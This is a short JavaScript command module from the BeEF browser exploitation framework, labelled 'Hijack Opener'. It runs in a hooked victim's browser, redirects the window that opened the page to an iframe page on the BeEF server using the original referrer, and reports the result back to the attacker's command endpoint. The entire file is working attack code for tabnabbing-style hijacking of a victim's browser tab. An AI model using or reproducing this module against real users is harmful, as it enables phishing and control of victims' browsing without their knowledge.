//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var referrer = document.referrer;
  try {
    beef.debug("[Hijack Opener] Trying to hijack: " + referrer);
    window.opener.location = beef.net.httpproto + '://' + beef.net.host+ ':' + beef.net.port + '/iframe#' + referrer;
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "success=hijacked window.opener.location", beef.are.status_success());
  } catch (e) {
    beef.debug("[Hijack Opener] could not hijack opener window: "+e.message)
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not hijack opener window: " + e.message, beef.are.status_error());
  }
});
